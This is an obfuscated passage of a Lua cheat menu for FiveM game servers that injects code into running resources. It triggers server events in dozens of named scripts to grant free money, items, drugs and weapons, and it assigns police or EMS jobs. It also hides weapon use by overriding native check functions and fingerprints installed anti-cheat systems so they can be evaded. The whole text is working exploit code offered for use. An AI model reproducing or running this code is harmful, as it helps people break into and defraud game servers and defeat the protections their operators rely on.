{ [1] = "cash", [2] = 1, [3] = "true", [4] = "false" } }, ["suc"] = true, ["xp"] = 6, ["itemName"] = "Pistol", ["time"] = 0, ["amount"] = %d, ["isPending"] = false, ["isDone"] = true, ["isItem"] = true, ["isDis"] = false, ["sucPC"] = 85 } } }) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="pug_business_creator") then local v468=0;while true do if ((0 -0)==v468) then v69(('pcall(function() TriggerServerEvent("Pug:server:NewGivBusinessItemAfterHacks", true, "%s", %d) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="pug_chopping") then v69(('pcall(function() TriggerServerEvent("Pug:server:GiveChoppingCarPay", %d) end)'):format(v340));v240=true;elseif (v265.id=="pug_fishing") then v69(('pcall(function() TriggerServerEvent("Pug:server:GiveFish", "%s", %d) end)'):format(v339,v340));v240=true;elseif (v265.id=="pug_robbery_creator") then local v469=0 + 0 ;while true do if (v469==0) then v69(('pcall(function() TriggerServerEvent("Pug:server:RobberyGiveItem", true, "%s", %d) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="qb_crafting") then local v470=0 + 0 ;while true do if (v470==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("qb-crafting:server:receiveItem", "%s", {}, %d, 0) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="qb_drugs") then local v471=0;while true do if (v471==0) then v69(('pcall(function() TriggerServerEvent("qb-drugs:server:giveDrugs", "%s", %d) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="qb_garbage_job") then v69(('pcall(function() TriggerServerEvent("qb-garbagejob:server:PayShift", %d, "") end)'):format(v340));v240=true;elseif (v265.id=="qb_hotdog_job") then v69(('pcall(function() local ped = GetPlayerPed(-1) local pedCoords = GetEntityCoords(ped) local HotdogsForSale = 1 local SellingPrice = %d TriggerServerEvent("qb-hotdogjob:server:Sell", pedCoords, HotdogsForSale, SellingPrice) end)'):format(v340));v240=true;elseif (v265.id=="qb_recycle_job") then v69(('pcall(function() TriggerServerEvent("recycle:giveReward", "%s", %d) end)'):format(v339,v340));v240=true;elseif (v265.id=="qb_trash_search") then local v472=0;while true do if (v472==0) then v69(('pcall(function() TriggerServerEvent("qb-trashsearch:server:givemoney", math.random(%d, 9999999999999999)) end)'):format(v340));v240=true;break;end end elseif (v265.id=="qb_warehouse") then v69(('pcall(function() TriggerServerEvent("inside-warehouse:Payout", %d) end)'):format(v340));v240=true;elseif (v265.id=="rm_camperv") then local v473=0 + 0 ;while true do if (v473==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("camperv:server:giveItem", "%s", %d) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="ry_rent") then v69(('pcall(function() TriggerServerEvent("ry-vehiclerental:giveMoney", %d) end)'):format(v340));v240=true;elseif (v265.id=="savana_trucker") then local v474=1414 -(1001 + 413) ;while true do if (v474==0) then v69(('pcall(function() TriggerServerEvent("savana-truckerJob:addXpAndMoney", %d, %d) end)'):format(v340,v340));v240=true;break;end end elseif (v265.id=="sayer_jukebox") then v69(('pcall(function() TriggerServerEvent("sayer-jukebox:AddItem", "%s", %d) end)'):format(v339,v340));v240=true;elseif (v265.id=="sell_usb") then local v475=0 -0 ;while true do if (v475==(882 -(244 + 638))) then v69(('pcall(function() TriggerEvent("sell_usb:findClient", { i = 8, label = "CodePlugRunsYourShit", type = "codeplug", zone = "The Meat Quarter", price = %d, count = 0 }) end)'):format(v340));v240=true;break;end end elseif (v265.id=="snipe_boombox") then local v476=0;while true do if (v476==(693 -(627 + 66))) then v69(('pcall(function() TriggerServerEvent("snipe-boombox:server:pickup", %d, vector3(0.0, 0.0, 0.0), "%s") end)'):format(v340,v339));v240=true;break;end end elseif (v265.id=="solos_cashier") then v69(('pcall(function() TriggerServerEvent("solos-cashier:server:addmoney", "bank", %d) end)'):format(v340));v240=true;elseif (v265.id=="solos_food") then local v477=0 -0 ;while true do if (v477==0) then v69(('pcall(function() TriggerServerEvent("solos-food:server:itemadd", "%s", %d) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="solos_hookah") then local v478=602 -(512 + 90) ;while true do if (v478==(1906 -(1665 + 241))) then v69(('pcall(function() TriggerServerEvent("solos-hookah:server:Buy-Item", "%s", %d, 0) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="solos_jointroll") then local v479=717 -(373 + 344) ;while true do if (v479==0) then v69(('pcall(function() TriggerServerEvent("solos-jointroll:server:ItemAdd", "%s", %d) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="solos_joints") then local v480=0 + 0 ;while true do if (v480==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("solos-joints:server:itemadd", "%s", %d) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="solos_methlab") then v69(('pcall(function() TriggerServerEvent("solos-methlab:server:itemadd", "%s", %d, true) end)'):format(v339,v340));v240=true;elseif (v265.id=="solos_moneywash") then local v481=0 -0 ;while true do if (v481==(0 -0)) then v69(('pcall(function() TriggerServerEvent("solos-moneywash:server:ItemAdd", "%s", %d) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="solos_restaurants") then local v482=1099 -(35 + 1064) ;while true do if (v482==0) then v69(('pcall(function() TriggerServerEvent("solos-food:server:itemadd", "%s", %d) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="t1ger_gangsystem") then local v483=0;while true do if (v483==0) then v69(('pcall(function() TriggerServerEvent("t1ger_lib:server:addItem", "%s", %d, "codeplugrunsu") end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="t1ger_lib") then local v484=0;while true do if (v484==0) then v69(('pcall(function() TriggerServerEvent("t1ger_lib:server:addItem", "%s", %d) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="zat_weed") then v69(('pcall(function() TriggerServerEvent("zat-weed:server:AddItem", "%s", nil, %d) end)'):format(v339,v340));v240=true;elseif (v265.id=="zat_farming") then local v485=0 + 0 ;while true do if (v485==(0 -0)) then v69(('pcall(function() TriggerServerEvent("zat-farming:server:GiveItem", "%s", %d) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="xmmx_letscookplus") then v69(('pcall(function() TriggerServerEvent("xmmx_letscookplus:server:BuyItems", { totalCost = 0, cart = { { name = "%s", quantity = %d } } }, "bank") end)'):format(v339,v340));v240=true;end if v240 then MachoMenuNotification("WizeMenu","Trigger Worked, Enjoy! Using: "   .. v265.name ,1 + 4 );break;end end end if  not v240 then local v304={["qb-uwujob"]=function() MachoInjectResource2(3,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                    local function aswdaw4atsdf()
                        TriggerServerEvent("qb-uwujob:addItem", "]]   .. v236   .. [[", ]]   .. v237   .. [[)
                    end
                    aswdaw4atsdf()
                ]] );end,skirpz_drugplug=function() MachoInjectResource2(1239 -(298 + 938) ,(v48("ReaperV4") and "ReaperV4") or (v48("monitor") and "monitor") or "any" ,[[
                    local function fawfafffsfzxfzx()
                        XTYZ = CreateThread
                        XTYZ(function()
                            for i = 1, ]]   .. v237   .. [[ do
                                local dealer = "shop" .. math.random(1000,9999)
                                TriggerServerEvent = TriggerServerEvent
                                TriggerServerEvent('shop:purchaseItem', shop, ']]   .. v236   .. [[', 0)
                                Wait(100)
                            end
                        end)
                    end
                    fawfafffsfzxfzx()
                ]] );end,ak47_whitewidowv2=function() MachoInjectResource2(3,(v48("ReaperV4") and "ReaperV4") or (v48("monitor") and "monitor") or "any" ,[[
                    local function aXj49WqTpL()
                        local keyName = "ak47_whitewidowv2:process"
                        TriggerServerEvent(keyName, "]]   .. v236   .. [[", {money = 0}, ]]   .. v237   .. [[, 0)
                    end
                    aXj49WqTpL()
                ]] );end,ak47_business=function() MachoInjectResource2(1262 -(233 + 1026) ,(v48("ReaperV4") and "ReaperV4") or (v48("monitor") and "monitor") or "any" ,[[
                    local function agjw37257gj()
                        local keyName = "ak47_business:processed"
                        TriggerServerEvent(keyName, "]]   .. v236   .. [[", ]]   .. v237   .. [[)
                    end
                    agjw37257gj()
                ]] );end,ars_hunting=function() MachoInjectResource2(3,(v48("ReaperV4") and "ReaperV4") or (v48("monitor") and "monitor") or "any" ,[[
                    local function ZqMwLpTrYv()
                        local keyName = "ars_hunting:sellBuyItem"
                        TriggerServerEvent(keyName, { buy = true, item = "]]   .. v236   .. [[", price = 0, quantity = ]]   .. v237   .. [[ })
                    end
                    ZqMwLpTrYv()
                ]] );end,fivecode_camping=function() MachoInjectResource2(3,(v48("monitor") and "monitor") or "any" ,[[
                    local function GnRtCvXpKa()
                        local keyName = 'fivecode_camping:callCallback'
                        local KeyNameParams = 'fivecode_camping:shopPay'
                        TriggerServerEvent(keyName, KeyNameParams, 0, {
                            ['price'] = 0,
                            ['item'] = "]]   .. v236   .. [[",
                            ['amount'] = ]]   .. v237   .. [[,
                            ['label'] = 'WizeMenu'
                        }, {
                            ['args'] = {
                                ['payment'] = {
                                    ['bank'] = true,
                                    ['cash'] = true
                                }
                            },
                            ['entity'] = 9218,
                            ['distance'] = 0.64534759521484,
                            ['hide'] = false,
                            ['type'] = 'bank',
                            ['label'] = 'Open Shop',
                            ['coords'] = 'vector3(-773.2181, 5597.66, 33.97217)',
                            ['name'] = 'npcShop-vec4(-773.409973, 5597.819824, 33.590000, 172.910004)'
                        })
                    end
                    GnRtCvXpKa()
                ]] );end,spoodyGunPlug=function() MachoInjectResource2(1669 -(636 + 1030) ,(v48("spoodyGunPlug") and "spoodyGunPlug") or "any" ,[[
                    local function GnRtCvXpKa()
                        common:giveItem({ { item = "]]   .. v236   .. [[", amount = ]]   .. v237   .. [[ } })  
                    end
                    GnRtCvXpKa()
                ]] );end,["solos-weedtable"]=function() MachoInjectResource2(2 + 1 ,(v48("ReaperV4") and "ReaperV4") or (v48("monitor") and "monitor") or "any" ,[[
                    local function aqrqtsgw32w523w()
                        local keyName = "solos-weed:server:itemadd"
                        TriggerServerEvent(keyName, "]]   .. v236   .. [[", ]]   .. v237   .. [[)
                    end
                    aqrqtsgw32w523w()
                ]] );end};local v305=false;for v341,v342 in pairs(v304) do if (GetResourceState(v341)=="started") then local v383=0 + 0 ;while true do if (v383==0) then v342();v305=true;break;end end end end if  not v305 then MachoMenuNotification("[NOTIFICATION] WizeMenu","No Triggers Found.");end end end);MachoMenuButton(v46[1 + 1 ],"Police Job",function() local v241=0 + 0 ;while true do if (v241==(221 -(55 + 166))) then if  not v7() then return;end if v48("wasabi_multijob") then MachoInjectResource("wasabi_multijob",[[
           local job = { label = "Police", name = "police", grade = 1, grade_label = "Officer", grade_name = "officer" }
           TriggerEvent('esx:setJob',)
        ]]);else MachoMenuNotification("[NOTIFICATION] WizeMenu","Resource Not Found.");end break;end end end);MachoMenuButton(v46[1 + 1 ],"EMS Job",function() if  not v7() then return;end if v48("wasabi_multijob") then MachoInjectResource("wasabi_multijob",[[
            local job = { label = "EMS", name = "ambulance", grade = 1, grade_label = "Medic", grade_name = "medic" }
            TriggerServerEvent('wasabi_multijob:addJob', job)
        ]]);else MachoMenuNotification("[NOTIFICATION] WizeMenu","Resource Not Found.");end end);MachoMenuButton(v46[1 + 2 ],"Spoofed Weapon Bypass",function() local v242=[[
            _G.GetCurrentPedWeapon = function() return -1569615261 end
            _G.IsPedSwappingWeapon = function() return false end
            _G.GetSelectedPedWeapon = function() return -1569615261 end
            _G.GetWeapontypeGroup = function() return -1569615261 end
            _G.IsPedArmed = function() return false end
            _G.HasPedGotWeapon = function() return false end
            _G.IsPedShooting = function() return false end
            _G.WasPedShooting = function() return false end
            _G.RemoveAllPedWeapons = function() return false end
            _G.RemoveWeaponFromPed = function() return false end
            _G.IsPedDoingDriveby = function() return false end
            _G.IsPedSwitchingWeapon = function() return false end
            _G.GetBestPedWeapon = function() return -1569615261 end
            _G.GetAmmoInPedWeapon = function() return 0 end
            _G.GetPedAmmoTypeFromWeapon = function() return 0 end
            _G.GetCurrentPedWeaponEntityIndex = function() return -1 end
            _G.GetPedAmmoTypeFromWeapon_2 = function() return 0 end
            _G.GetWeapontypeModel = function() return -1569615261 end
            _G.GetEntityType = function() return 0 end
            _G.GetEntityAttachedTo = function() return false end
            _G.GetWeaponNameFromHash = function() return -1569615261 end
            _G.IsPedReloading = function() return false end
        ]];local function v243() local v267=CreateThread;v267(function() for v343=0,GetNumResources() -(3 -2)  do local v344=GetResourceByFindIndex(v343);if (v344 and (GetResourceState(v344)=="started")) then local v384=297 -(36 + 261) ;while true do if (v384==0) then MachoInjectResource(v344,string.format([[
                            print("[ JTG ] - Resource Name: %s")
                            %s
                        ]],v344,v242));Wait(200);break;end end end end end);end end);MachoMenuButton(v47[1 -0 ],"Uninject",function() local v244=1368 -(34 + 1334) ;while true do if (v244==(1 + 0)) then MachoMenuDestroy(v20);break;end if ((0 + 0)==v244) then MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            Stopped = true
        ]]);MachoInjectResource((v48("core") and "core") or (v48("es_extended") and "es_extended") or (v48("qb-core") and "qb-core") or (v48("monitor") and "monitor") or "any" ,[[
            anvzBDyUbl = false
            if fLwYqKoXpRtB then fLwYqKoXpRtB() end
            kLpMnBvCxZqWeRt = false
        ]]);v244=1284 -(1035 + 248) ;end end end);MachoMenuCheckbox(v47[2],"RGB Menu",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if FmxmAlwkjfsfmaW == nil then FmxmAlwkjfsfmaW = false end
            FmxmAlwkjfsfmaW = true

            local function CreateRGBUI()
                local wfgsmWAEJKF = CreateThread
                wfgsmWAEJKF(function()
                    local offset = 0.0
                    while FmxmAlwkjfsfmaW and not Unloaded do
                        offset = offset + 0.065
                        local r = math.floor(127 + 127 * math.sin(offset))
                        local g = math.floor(127 + 127 * math.sin(offset + 2))
                        local b = math.floor(127 + 127 * math.sin(offset + 4))
                        MachoMenuSetAccent(MenuWindow, r, g, b)
                        Wait(25)
                    end
                end)
            end

            CreateRGBUI()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            FmxmAlwkjfsfmaW = false
        ]]);end);local v70,v71,v72=207,16,53 -(20 + 1) ;MachoMenuSlider(v47[2 + 0 ],"R",v70,319 -(134 + 185) ,1388 -(549 + 584) ,"",685 -(314 + 371) ,function(v245) v70=v245;MachoMenuSetAccent(v20,math.floor(v70),math.floor(v71),math.floor(v72));end);MachoMenuSlider(v47[6 -4 ],"G",v71,968 -(478 + 490) ,136 + 119 ,"",1172 -(786 + 386) ,function(v246) v71=v246;MachoMenuSetAccent(v20,math.floor(v70),math.floor(v71),math.floor(v72));end);MachoMenuSlider(v47[6 -4 ],"B",v72,1379 -(1055 + 324) ,255,"",1340 -(1093 + 247) ,function(v247) v72=v247;MachoMenuSetAccent(v20,math.floor(v70),math.floor(v71),math.floor(v72));end);MachoMenuButton(v47[3 + 0 ],"Anti-Cheat Checker",function() local function v248(v268,...) MachoMenuNotification("[NOTIFICATION] JTG Menu",string.format(v268,...));end local function v249(v269,v270) local v271=0 + 0 ;local v272;while true do if (v271==(0 -0)) then v272=LoadResourceFile(v269,v270);return v272~=nil ;end end end local v250=GetNumResources();local v251={{name="ai_module_fg-obfuscated.lua",acName="FiveGuard"}};for v273=0,v250-1  do local v274=0;local v275;local v276;local v277;while true do if (v274==0) then v275=GetResourceByFindIndex(v273);v276=string.lower(v275);v274=2 -1 ;end if (v274==2) then if (v276:sub(2 -1 ,3 + 4 )=="reaperv") then v277="ReaperV4";elseif (v276:sub(3 -2 ,4)=="fini") then v277="FiniAC";elseif (v276:sub(3 -2 ,6 + 1 )=="chubsac") then v277="ChubsAC";elseif (v276:sub(2 -1 ,694 -(364 + 324) )=="fireac") then v277="FireAC";elseif (v276:sub(2 -1 ,16 -9 )=="drillac") then v277="DrillAC";elseif (v276:sub( -(3 + 4))=="eshield") then v277="WaveShield";elseif (v276:sub( -(41 -31))=="likizao_ac") then v277="Likizao-AC";elseif (v276:sub(1 -0 ,15 -10 )=="greek") then v277="GreekAC";elseif (v276=="pac") then v277="PhoenixAC";elseif (v276=="electronac") then v277="ElectronAC";end if v277 then v248("Anti-Cheat: %s",v277);AntiCheat=v277;return v275,v277;end break;end if (v274==1) then for v385,v386 in ipairs(v251) do if v249(v275,v386.name) then local v410=0;while true do if (v410==1) then return v275,v386.acName;end if (v410==0) then v248("Anti-Cheat: %s",v386.acName);AntiCheat=v386.acName;v410=1;end end end end v277=nil;v274=1270 -(1249 + 19) ;end end end v248("No Anti-Cheat found");return nil,nil;end);MachoMenuButton(v47[3 + 0 ],"Framework Checker",function() local function v252(v278,...) MachoMenuNotification("[NOTIFICATION] JTG Menu",string.format(v278,...));end local function v253(v279) return GetResourceState(v279)=="started" ;end local v254={{label="ESX",globals={"ESX"},resources={"es_extended","esx-legacy"}},{label="QBCore",globals={"QBCore"},resources={"qb-core"}},{label="Qbox",globals={},resources={"qbox"}},{label="QBX Core",globals={},resources={"qbx-core"}},{label="ox_core",globals={"Ox"},resources={"ox_core"}},{label="ND_Core",globals={"NDCore"},resources={"nd-core","ND_Core"}},{label="vRP",globals={"vRP"},resources={"vrp"}}};local function v255() for v306,v307 in ipairs(v254) do for v345,v346 in ipairs(v307.globals) do if (_G[v346]~=nil) then return v307.label;end end end for v308,v309 in ipairs(v254) do for v347,v348 in ipairs(v309.resources) do if v253(v348) then return v309.label;end end end return "Standalone";end local v256=v255();v252("Framework: %s",v256);end);local v54=0;local v55={[0 + 0 ]={name="Default",hash="MP_F_Freemode"},[1 + 0 ]={name="Gangster",hash="Gang1H"},[2 + 0 ]={name="Wild",hash="GangFemale"},[5 -2 ]={name="Red Neck",hash="Hillbilly"}};
